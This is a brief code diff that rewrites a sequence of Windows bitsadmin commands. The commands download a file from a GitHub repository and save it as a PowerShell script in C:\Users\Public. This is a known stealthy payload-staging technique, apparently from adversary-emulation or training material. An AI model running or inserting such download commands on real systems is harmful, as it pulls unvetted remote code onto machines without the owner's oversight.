@@ -1,4 +1,5 @@
-cmd /c "bitsadmin /create jobDownload"
-cmd /c "bitsadmin /addfile jobDownload https://raw.githubusercontent.com/thiagosmith/THA-ADINT/refs/heads/main/files/artefato C:\Users\Public\artefato.ps1"
-cmd /c "bitsadmin /resume jobDownload"
-cmd /c "bitsadmin /complete jobDownload"
+bitsadmin /create jobDownload
+bitsadmin /addfile jobDownload https://raw.githubusercontent.com/thiagosmith/THA-ADINT/refs/heads/main/files/artefato C:\Users\Public\artefato.ps1
+bitsadmin /resume jobDownload
+bitsadmin /complete jobDownload
+bitsadmin /list /verbose
